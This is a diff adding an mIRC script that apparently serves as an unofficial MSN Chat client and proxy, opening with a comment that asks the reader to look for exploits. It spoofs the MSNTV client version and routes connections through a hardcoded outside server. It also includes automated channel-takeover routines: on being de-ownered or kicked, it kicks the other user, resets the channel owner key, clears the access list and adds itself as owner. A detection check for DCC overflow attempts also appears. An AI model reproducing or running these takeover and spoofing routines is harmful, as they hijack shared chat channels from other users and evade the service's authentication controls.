@@ -1,0 +1,248 @@
+;Look through all of this and tell me if you see any exploit(double click to take control)
+
+alias starttry {
+  var %a = $com(MSNAuth,GetIRCVERS,1,string)
+  .timertry1 50 0 try1
+  .timertry2 50 0 try2
+}
+
+alias try1 { 
+  echo -a With COM $ticks $com(MSNAuth).result
+}
+alias try2 {
+  echo -a With NOM $ticks IRCVERS IRC5 MSNTV-TELCO!8.00.0211.1802
+}
+
+
+on *:START:{
+  .comopen MSNAuth MSNAuth.Class1
+  if ($comerr) {
+    echo -s The MSN Chat Libary needs to be registered for use.
+    halt
+  }
+  lhost
+  domsn
+}
+alias ircvers {
+  var %a = $com(MSNAuth,GetIRCVERS,1,string), %b = $com(MSNAuth).result
+  echo -s %b
+
+  return %b
+
+}
+alias authstart {
+  var %a = $com(MSNAuth,StartAuth,1,string,$1,string), %b = $com(MSNAuth).result
+  echo -s %b
+  return %b
+
+}
+alias contauth {
+  var %a = $com(MSNAuth,ContinueAuth,1,string,$2-,string,$1,string), %b = $com(MSNAuth).result
+  return %b
+}
+alias f2 {
+  sockclose *
+  lhost
+  .timer1 1 1 domsn
+
+}
+alias lhost {
+  socklisten firc $freeport
+  server 127.0.0.1 $sock(firc).port
+}
+
+on *:socklisten:firc:{
+  sockaccept mIRC
+  sockclose firc
+  sockwrite -tn mIRC :Xeon 001 $me :Welcome to the Xeon Connection.
+  sockwrite -tn mIRC :Xeon 002 $me :Connection Type: Non-Force
+  sockwrite -tn mIRC :Xeon 003 $me :Xeon Ocxless Connection. Version 1.0
+  sockwrite -tn mIRC :Xeon 004 $me :Xeon aioxz abcdefhiklmnoprstuvxyz
+  sockwrite -tn mIRC :Xeon 800 $me 1 0 GateKeeper,NTLM 512
+  sockwrite -tn mIRC :Xeon NOTICE $me :By Sky
+}
+
+on *:sockread:mIRC:{
+  var %data
+  sockread %data
+  tokenize 32 %data
+  if ($1 == JOIN) { set %join $2- | sr lookups FINDS $2- }
+  if ($me ison $2) { sr $findjoinedsocket($2) $1- }
+  if ($comchan($2,1)) { sockwrite -tn $findjoinedsocket($comchan($2,1)) $1- }
+}
+alias lookupsIP return 203.122.73.95
+alias findjoinedsocket {
+  var %socket
+  var %i = 1
+  while (%i <= $sock(*,0)) {
+    if ($sock(*,%i).mark == $$1) { %socket = $sock(*,%i) | %i = $sock(*,0) }
+    inc %i
+  }
+  return %socket
+}
+
+alias domsn {
+  sockopen Lookups $lookupsip 8081
+
+}
+
+alias sr {
+  echo -s send: $2-
+  sockwrite -tn $1 $2-
+}
+
+on *:sockopen:Lookups:{
+  set %startauth $ticks
+  sr $sockname > $+ $me
+  .timerkeepfinds 0 15 keepfinds $sockname $sock($sockname).ip
+  sr $sockname $ircvers
+  sr $sockname $authstart(> $+ $me)
+}
+
+alias KeepFinds {
+  if ($sock($$1).status == active) { sockwrite -tn $$1 VERSION }
+  elseif ($sock($$1).status == sckConnecting) { halt }
+  elseif (!$sock($$1)) { sockopen $$1 $$2 6667 }
+  else halt
+}
+
+on *:sockread:Lookups:{
+  var %data
+  sockread %data
+  tokenize 32 %data
+  echo -s get: $1-
+  if ($$2 == 351) { halt }
+  if ($1 == AUTH) && ($3 == S) {
+    sr $sockname $replace($contauth(> $+ $me,$1-),GateKeeperPassport,Sky,GateKeeper,Sky)
+  }
+  elseif ($1-4 == AUTH Gatekeeper S :OK) {
+    sr $sockname AUTH GatekeeperPassport S : $+ $passform(%ticket,%profile)
+    ;sockwrite -tn $sockname USER $me "Xeon" "Xeon.co.uk" :4Xeon
+    sr $sockname NICK $me
+    sr $sockname PROP $chr(36) SUBSCRIBERINFO : $+ %sinfo
+  }
+  elseif ($1 $3 == AUTH *) { 
+    echo -s $calc($ticks - %startauth)
+    sr $sockname NICK > $+ $me
+  }
+  elseif ($2 == 613) {
+    var %ext = $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z)
+    sockopen Xeon. $+ %ext $remove($4,:) $5
+    sockmark Xeon. $+ %ext %join
+  }
+  elseif ($2 == 910) {
+    sockclose $sockname 
+    sockopen Lookups 207.68.167.253 6667  
+  }
+  else sockwrite -tn mIRC $1-
+}
+
+on *:sockopen:Xeon.*:{
+  ; sr $sockname > $+ $me
+  ;.timerkeepfinds 0 15 keepfinds $sockname $sock($sockname).ip
+  sr $sockname NICK $me
+  sr $sockname $replace($ircvers,MSNTV-TELCO,MSN-MSNTV)
+  sr $sockname AUTH GateKeeperPassport I :GKSSP\0r\0\0\0\0\0\0
+}
+
+on *:sockread:Xeon.*:{
+  var %data
+  sockread %data
+  tokenize 32 %data
+  ;echo -s get: $1-
+  if ($$2 == 351) { halt }
+  elseif ($1-4 == AUTH Gatekeeper S :OK) {
+    sr $sockname AUTH GatekeeperPassport S : $+ $passform(%ticket,%profile)
+    sr $sockname USER $me "Xeon" "Xeon.co.uk" :4Xeon
+    sr $sockname PROP $me MSNPROFILE :0
+    sr $sockname PROP $me SUBSCRIBERINFO : $+ %sinfo
+    sr $sockname JOIN $sock($sockname).mark
+  }
+  elseif ($1 == AUTH) && ($3 == S) {
+    sr $sockname $contauth(> $+ $me,$1-)
+  }
+  elseif ($1-3 == AUTH GateKeeper *) { 
+    sr $sockname USER $me "rewt" "rewt.co.uk" :4rewt
+    ;sr $sockname NICK > $+ $me
+  }
+  elseif ($2 == QUIT) { sockwrite -tn mIRC $1 PART $sock($sockname).mark }
+  elseif ($2 == 353) {
+    if ($chr(44) isin $6) {
+      var %a = 6
+      var %b
+      while (%a <= $0) {
+        if (%b == $null) %b = $remove($gettok($gettok($1-,%a,32),4,44),:)
+        else %b = %b $gettok($gettok($1-,%a,32),4,44)
+        inc %a
+      }
+      sockwrite -n mIRC :Xeon 353 $me = $5 : $+ %b
+    }
+    else { sockwrite -n mIRC $1- }
+  }
+  elseif ($2 == 914) { halt }
+  elseif ($4 == OWNERKEY) {
+    set %key. $+ $3 $remove($5,:)
+    sockwrite -tn mIRC $1- 
+  }
+  elseif ($4 == HOSTKEY) {
+    set %hkey. $+ $3 $remove($5,:)
+    sockwrite -tn mIRC $1- 
+  }
+  elseif ($wildtok($1,*,1,33) $2 $4 $5 == $iif(: $+ $me == $wildtok($1,*,1,33),:,$wildtok($1,*,1,33)) MODE -q $me) {
+    if (!%massflood) {
+      sockwrite -n $sockname $+(mode $me +h %key. [ $+ [ $3 ] ],$lf,kick $3 $wildtok($1,*,1,33),$lf,prop $3 OWNERKEY :,$rand(0,9),$rand(A,Z),$rand(a,z),$lf,access $3 CLEAR,$cr,access $3 add owner $ial($me) 0 : $+ 4Xeon $+ $crlf)
+      sockwrite -tn mIRC $1- 
+      set -u2 %massflood
+    }
+    echo # 4Sockread has picked up a deowner from $remove($gettok($1,1,33),$chr(58))
+  }
+  elseif ($2 == MODE) && ($4 $5 == +q $me) { 
+    if (!%sockownerflood) {
+      set -u3 %sockownerflood TRUE | sockwrite -n $sockname prop $3 OWNERKEY : $+ $rand(A,Z) $+ $rand(a,z) $+ $rand(0,9) | sockwrite -tn $sockname ACCESS $3 ADD OWNER $ial($me).addr 0 $chr(58) $+ 4Xeon
+    }
+    sockwrite -tn mIRC $1- 
+  }
+  elseif ($2 == 821) {
+    echo $sock($sockname).mark 3*** Back $remove($gettok($1,1,33),$chr(58))
+    if ($remove($1,$chr(58)) ==   Sky!BF33FA67DC1344DC@GateKeeperPassport) { sockwrite -tn $sockname AWAY }
+    halt 
+  }
+  elseif ($2 == 910) { sockclose $sockname }
+  elseif ($2 == 822) { 
+    echo $sock($sockname).mark 3*** Away $remove($gettok($1,1,33),$chr(58)) reason: $remove($3-,:)
+    if ($remove($1,$chr(58)) ==   Sky!BF33FA67DC1344DC@GateKeeperPassport) { sockwrite -tn $sockname AWAY : $+ $remove($3-,:) }
+    halt 
+  }
+  elseif ($2 == KICK) && ($4 == $me) && ($remove($gettok($1,1,33),$chr(58)) != $me) {
+    echo $3 4Sockread Detected a Kick from $remove($gettok($1,1,33),:)
+    sockwrite -n $sockname join $3 %key. [ $+ [ $3 ] ] $lf kick $3 $remove($gettok($1,1,33),:) :Sockread has picked up a Kick from $remove($gettok($1,1,33),:) $lf prop $3 OWNERKEY Xeon $+ $rand(1000,9999) $+ // $+ $chr($rand(120,130)) $+ $chr($rand(120,130)) $+ $chr($rand(120,130)) $+ $chr($rand(120,130)) $+ $chr($rand(120,130)) $+ $chr($rand(120,130)) $+ $chr($rand(120,130)) $+ $chr($rand(120,130)) $+ $chr($rand(120,130)) $lf access $3 clear $lf access $3 add owner $ial($me).addr 0 : Xeon $+ $me $cr
+  }
+  elseif ($2 == PRIVMSG) {
+    if ($4 == :DCC) && ($5 == send) && ($len($6-) >= 225) { echo -s 4 WARNING! $remove($gettok($1,1,33),:) Just Try'd to DCC Exploit you. | halt }
+    if (!%quickctcp) {
+      if (ADMIN$VERSION isin $4) { echo -s 14[15ADMIN$VERSION14]1:4 $remove($gettok($1,1,33),:) | ctcpreply $remove($gettok($1,1,33),:) VERSION [4Xeon] | halt }
+      elseif (VERSION isin $4) { echo -s 14[15VERSION14]1:4 $remove($gettok($1,1,33),:) | ctcpreply $remove($gettok($1,1,33),:) VERSION [4Xeon] | halt }
+      elseif (TIME isin $4) { echo -s 14[15TIME14]1:4 $remove($gettok($1,1,33),:) | if (!%timefloodsck) { ctcpreply $remove($gettok($1,1,33),:) TIME $date(dd/mm/yyyy) $+ , $time(h:nn:ss TT) | set -u10 %timefloodsck TRUE } | return }
+      elseif (PING isin $4) { echo -s 14[15PING14]1:4 $remove($gettok($1,1,33),:) | sockwrite -tn mIRC $1- }
+      elseif (FINGER isin $4) { echo -s 14[15FINGER14]1:4 $remove($gettok($1,1,33),:) | halt }
+      elseif (ID isin $4) { echo -s 14[15ID14]1:4 $remove($gettok($1,1,33),:) | halt }
+      set -u10 %quickctcp 
+    }
+    if (: $+ $chr(1) $+ S isin $1-) { sockwrite -tn mIRC $1 $2 $3 : $+ $left($6-,-1) | halt }
+    else sockwrite -tn mIRC $1-
+  }
+  elseif ($1 == PING) { sr $sockname PONG $2- }
+  else sockwrite -tn mIRC $1-
+}
+alias FreePort { 
+  var %port
+  :RePort
+  %port = $rand(1000,9999)
+  if (!$portfree(%port)) { goto report }
+  return %port
+}
+
+alias -l guestform {
+  return $mid($1,7,2) $+ $mid($1,5,2) $+ $mid($1,3,2) $+ $left($1,2) $+ $mid($1,11,2) $+ $mid($1,9,2) $+ $mid($1,15,2) $+ $mid($1,13,2) $+ $right($1,16)
+}
+alias passform return $base($len($$1),10,16,8) $+ $1 $+ $base($len($$2),10,16,8) $+ $2
